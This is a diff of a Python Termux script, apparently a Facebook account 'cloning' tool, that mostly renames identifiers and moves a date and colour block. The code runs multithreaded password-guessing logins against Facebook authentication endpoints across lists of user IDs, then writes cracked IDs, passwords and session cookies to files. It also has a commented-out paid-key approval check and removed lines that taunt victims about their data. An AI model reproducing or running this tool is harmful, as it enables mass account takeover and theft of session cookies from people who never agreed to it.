@@ -1,6 +1,6 @@
 import os
-os.system('espeak -a 400 " TRY TO BUY PASS THIS TOOL MY SON TRY , HAHA YOUR DATA WILL BE CLEAR"')
-os.system('espeak -a 400 " AND DO NOT CRY MY SON HAHA , YOUR FATHER IS DOING GREAT JOB"')
+import datetime
+from datetime import datetime
 import os,zlib
 from os import system as osRUB
 from os import system as cmd
@@ -20,7 +20,7 @@ except ModuleNotFoundError:
     os.system('pip install mechanize > /dev/null')
 from urllib.request import Request, urlopen
 import os, requests, re,platform, sys, random, subprocess, threading, itertools,base64,uuid,zlib,re,json,uuid,subprocess,shutil,webbrowser,time,json,sys,random,datetime,time,re,subprocess,platform,string,json,time,re,random,sys,string,uuid
-from concurrent.futures import ThreadPoolExecutor as ToxicToxic
+from concurrent.futures import ThreadPoolExecutor as toxictoxic
 from string import * 
 from random import randint
 from time import sleep as slp
@@ -45,6 +45,42 @@ srange = 0
 saved = []
 totaldmp = 0
 filter = []
+
+#--------------------[ CONVERTER-BULAN ]--------------#
+ 
+dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
+dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
+tgl = datetime.datetime.now().day
+bln = dic[(str(datetime.datetime.now().month))]
+thn = datetime.datetime.now().year
+okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
+cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
+date = str(tgl)+'/'+str(bln)+'/'+str(thn)
+ltx = int(lt()[3])
+if ltx > 12:
+    a = ltx-12
+    tag = "PM"
+else:
+    a = ltx
+    tag = "AM"
+sys.stdout.write('\x1b]2; DADDY IZ HEAR\x07')
+S = '\033[1;37m'
+A = '\x1b[38;5;208m'
+R = '\x1b[38;5;46m'
+F = '\x1b[38;5;48m'
+Z = '\033[1;33m'
+A = '\x1b[1;97m' 
+B = '\x1b[1;96m' 
+C = '\x1b[1;91m' 
+D = '\x1b[1;92m'
+M = '\033[1;31m'
+H = '\033[1;32m'
+N = '\x1b[1;37m'	
+E = '\x1b[1;93m' 
+F = '\x1b[1;94m'
+G = '\x1b[1;95m'
+P = '\033[1;37m'
+head = {'Host': 'adsmanager.facebook.com', 'sec-ch-ua': '"Chromium";v="120", "Not=A?Brand";v="24"', 'viewport-width': '980'}
 import requests,os,time,requests,zlib
 t = '''#!/data/data/com.termux/files/usr/bin/python3.11
 # -*- coding: utf-8 -*-
@@ -1120,41 +1156,6 @@ for agent in range(10000):
 #--------------------
 def animation(u):
 	for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
-#--------------------[ CONVERTER-BULAN ]--------------#
- 
-dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
-dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
-tgl = datetime.datetime.now().day
-bln = dic[(str(datetime.datetime.now().month))]
-thn = datetime.datetime.now().year
-okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
-cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
-date = str(tgl)+'/'+str(bln)+'/'+str(thn)
-ltx = int(lt()[3])
-if ltx > 12:
-    a = ltx-12
-    tag = "PM"
-else:
-    a = ltx
-    tag = "AM"
-sys.stdout.write('\x1b]2; DADDY IZ HEAR\x07')
-S = '\033[1;37m'
-A = '\x1b[38;5;208m'
-R = '\x1b[38;5;46m'
-F = '\x1b[38;5;48m'
-Z = '\033[1;33m'
-A = '\x1b[1;97m' 
-B = '\x1b[1;96m' 
-C = '\x1b[1;91m' 
-D = '\x1b[1;92m'
-M = '\033[1;31m'
-H = '\033[1;32m'
-N = '\x1b[1;37m'	
-E = '\x1b[1;93m' 
-F = '\x1b[1;94m'
-G = '\x1b[1;95m'
-P = '\033[1;37m'
-head = {'Host': 'adsmanager.facebook.com', 'sec-ch-ua': '"Chromium";v="120", "Not=A?Brand";v="24"', 'viewport-width': '980'}
 #_________[ TRACKING USERS IP ]______>>
 ip = requests.get("https://api.ipify.org").text
 print('\033[0;97m[•] \033[0;92mTRACKING YOUR IP ADDRESS')
@@ -1162,7 +1163,7 @@ time.sleep(2)
 print("\033[0;97m[•] \x1b[1;92mTHIS IS YOUR IP ADDRESS \x1b[1;91m:\033[1;36m "+ip)
 logo =                                          """            
 
- /$$$$$$$$ /$$$$$$  /$$   /$$ /$$$$$$  /$$$$$$ 
+/$$$$$$$$ /$$$$$$  /$$   /$$ /$$$$$$  /$$$$$$ 
 |__  $$__//$$__  $$| $$  / $$|_  $$_/ /$$__  $$
    | $$  | $$  \ $$|  $$/ $$/  | $$  | $$  \__/
    | $$  | $$  | $$ \  $$$$/   | $$  | $$      
@@ -1175,7 +1176,7 @@ logo =                                          """
 def clear():
     os.system("clear")    
     print(logo)    
-os.system('espeak -a 400 " WELCOME SIR TO TOXIC CLONING TOOL"')
+os.system('espeak -a 400 " WELCOME SIR TO toxic CLONING TOOL"')
 uname =input('\033[1;97m[\033[1;92m•\033[1;97m]\033[1;92m WHAT IS YOUR NAME \033[1;91m: \33[1;32m')
 pass    
 #_________[ USER IP SERVER ]______>>
@@ -1192,17 +1193,46 @@ def result(OKs,cps):
 def linex():print(f'{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')    
 #------------------[ APPROVAL SYSTEM ]-------------------#
 '''
-Add your owne approval 
+def approval():
+  os.system('git pull')
+  time.sleep(1)
+  uuid = str(os.geteuid())+"69"+str(os.geteuid())
+  id = "SUPRAJ-"+"".join(uuid)
+  os.system('clear')
+  banner()
+  info()
+  animation("\033[1;37m [\u001b[36m•\033[1;37m] This Is Paid Tool You Need Approval To Use This Tool \033[1;37m")
+  print("\033[1;37m [\u001b[36m•\033[1;37m] Your Key :\u001b[36m "+id);time.sleep(0.1)
+  print ("""\033[1;37m--------------------------------------------------""")
+  try:
+    httpCaht = requests.get("https://github.com/SUPRAJ-8/APPROVAL/blob/main/APPROVAL.txt").text
+    if id in httpCaht:
+      animation(">> Your Key Has Been Approved !!!")
+      msg = str(os.geteuid())
+      time.sleep(1)
+      pass
+    else: 
+      animation(">> Sorry Your Key Has Not Been Approved ");
+      time.sleep(0.1)
+      input(' >> Click Enter To Send Your Key ')
+      os.system('xdg-open https://www.facebook.com/profile.php?id=100042145964429&mibextid=LQQJ4d')
+      time.sleep(1)
+      exit()
+  except: 
+     animation(" >> Error ")
+     time.sleep(2)
+     exit() 
+approval() 
 '''
 #_________[ MAIN MENU ]______>>
-def Toxic():   
+def toxic():   
     os.system('clear')
     print(logo)
     ip = requests.get("https://api.ipify.org").text
     print("\t \033[0;97m[•] \x1b[1;92mUSER IP ADDRESS \x1b[1;91m:\033[1;36m "+ip)
     print(47*'-')
-    print(f"\033[97;1m[\033[92;1m+\033[97;1m] \033[1;92mUSER NAME\033[1;91m :\033[1;96m "+uname)
-    print("\033[97;1m[\033[92;1m•\033[97;1m] \033[0;93mTODAY'S DATE :\033[1;92m "+date)
+    print(f"\033[97;1m[\033[92;1m+\033[97;1m] \033[1;92mUSER NAME\033[1;91m : \033[1;96m" + str(uname))
+ #####   print("\033[97;1m[\033[92;1m•\033[97;1m] \033[0;93mTODAY'S DATE :\033[1;92m " + str(date))
     print(47*'-')
     print(f'[1] FILE CLONING ')
     print(f'[2] RANDOM CLONING')
@@ -1222,7 +1252,7 @@ def Toxic():
     else:
         print('\n Select valid option ... ')
         time.sleep(2)
-        Toxic(allkey)
+        toxic(allkey)
         
 #------------------------[RANDOM]--------------------------#
 
@@ -1254,7 +1284,7 @@ def method_crack():
     #    methods.append('methodD')
    #     main_crack().crack(id)
     elif option =='0':
-        Toxic()
+        toxic()
     else:
       print('\n Select Valid Option ...')
       time.sleep(2)
@@ -1284,7 +1314,7 @@ class main_crack():
         try:
             global oks,cps,loop
             pro = random.choice(ugen)
-            sys.stdout.write(f"\r [Toxic-XD] {loop} | M1 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{G}")
+            sys.stdout.write(f"\r [toxic-XD] {loop} | M1 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{G}")
             sys.stdout.flush()
             fs = name.split(' ')[0]
             try:
@@ -1338,15 +1368,15 @@ class main_crack():
 
                 q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                 if 'session_key' in q:
-                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);Toxicb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={Toxicb};{ckkk}"
-                    print(f"\r{R} [Toxic-OK] {sid} | {ps} {S}")
+                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);toxicb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={toxicb};{ckkk}"
+                    print(f"\r{R} [toxic-OK] {sid} | {ps} {S}")
                     oks.append(sid)
-                    open('/sdcard/Toxic_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/Toxic_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
+                    open('/sdcard/toxic_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/toxic_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                     break
                 elif 'www.facebook.com' in q['error']['message']:
-                     print(f"\r{A} [Toxic-CP] {sid} | {ps} {S}")
+                     print(f"\r{A} [toxic-CP] {sid} | {ps} {S}")
                      cps.append(sid)
-                     open('/sdcard/Toxic_CP.txt','a').write(sid+'|'+ps+'\n')
+                     open('/sdcard/toxic_CP.txt','a').write(sid+'|'+ps+'\n')
                 else:
                     continue
             loop+=1
@@ -1356,7 +1386,7 @@ class main_crack():
     def methodC(self, sid, name, psw):
         try:
             global oks,cps,loop
-            sys.stdout.write(f"\r {S}[Toxic-XD] {loop} | M3 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
+            sys.stdout.write(f"\r {S}[toxic-XD] {loop} | M3 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
             sys.stdout.flush()
             ua = random.choice(ugen)	        
             fs = name.split(' ')[0]
@@ -1413,15 +1443,15 @@ class main_crack():
 
                 q = session.post("https://m.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                 if 'session_key' in q:
-                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);Toxicb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={Toxicb};{ckkk}"
-                    print(f"\r{R} [Toxic-OK] {sid} | {ps} {S}")
+                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);toxicb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={toxicb};{ckkk}"
+                    print(f"\r{R} [toxic-OK] {sid} | {ps} {S}")
                     oks.append(sid)
-                    open('/sdcard/Toxic_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/Toxic_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
+                    open('/sdcard/toxic_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/toxic_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                     break
                 elif 'www.facebook.com' in q['error']['message']:
-                    #  print(f"\r{A} [Toxic-CP] {sid} | {ps} {S}")
+                    #  print(f"\r{A} [toxic-CP] {sid} | {ps} {S}")
                     cps.append(sid)
-                    open('/sdcard/Toxic_CP.txt','a').write(sid+'|'+ps+'\n')
+                    open('/sdcard/toxic_CP.txt','a').write(sid+'|'+ps+'\n')
                 else:
                     continue
             loop+=1
@@ -1432,7 +1462,7 @@ class main_crack():
         try:
             global oks,cps,loop
             pro = random.choice(ugen)
-            sys.stdout.write(f"\r {S}[Toxic-XD] {loop} | M2 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
+            sys.stdout.write(f"\r {S}[toxic-XD] {loop} | M2 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
             sys.stdout.flush()
             ua = random.choice(ugen)
             fs = name.split(' ')[0]
@@ -1489,15 +1519,15 @@ class main_crack():
 
                 q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                 if 'session_key' in q:
-                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);Toxicb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={Toxicb};{ckkk}"
-                    print(f"\r{R} [Toxic-OK] {sid} | {ps} {S}")
+                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);toxicb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={toxicb};{ckkk}"
+                    print(f"\r{R} [toxic-OK] {sid} | {ps} {S}")
                     oks.append(sid)
-                    open('/sdcard/Toxic_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/Toxic_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
+                    open('/sdcard/toxic_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/toxic_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                     break
                 elif 'www.facebook.com' in q['error']['message']:
-                    #  print(f"\r{A} [Toxic-CP] {sid} | {ps} {S}")
+                    #  print(f"\r{A} [toxic-CP] {sid} | {ps} {S}")
                     cps.append(sid)
-                    open('/sdcard/Toxic_CP.txt','a').write(sid+'|'+ps+'\n')
+                    open('/sdcard/toxic_CP.txt','a').write(sid+'|'+ps+'\n')
                 else:
                     continue
             loop+=1
@@ -1528,7 +1558,7 @@ class main_crack():
             print(f'\033[0;97m[•]\x1b[1;92mYOUR TOTAL ID IM FILE: %s ' % len(self.id))
             print('\033[0;97m[•]\x1b[1;92mTHIS TOOL CRACKING HAS BEEN STARTED')
             print(47*"-")
-            with ToxicToxic(max_workers=30) as Toxicworld:
+            with toxictoxic(max_workers=30) as toxicworld:
                 for zsb in self.id:
                    try:
                        uid, name = zsb.split('|')
@@ -1538,13 +1568,13 @@ class main_crack():
                        else:
                             pwx =  pw
                             if 'methodA' in methods:
-                                Toxicworld.submit(self.methodA, uid, name, pwx)
+                                toxicworld.submit(self.methodA, uid, name, pwx)
                             elif 'methodB' in methods:
-                                Toxicworld.submit(self.methodB, uid, name, pwx)
+                                toxicworld.submit(self.methodB, uid, name, pwx)
                             elif 'methodC' in methods:
-                                Toxicworld.submit(self.methodC, uid, name, pwx)
+                                toxicworld.submit(self.methodC, uid, name, pwx)
                             elif 'methodD' in methods:
-                                Toxicworld.submit(self.methodD, uid, name, pwx)
+                                toxicworld.submit(self.methodD, uid, name, pwx)
                    except:pass
             result(oks,cps)   
-Toxic()
+toxic()
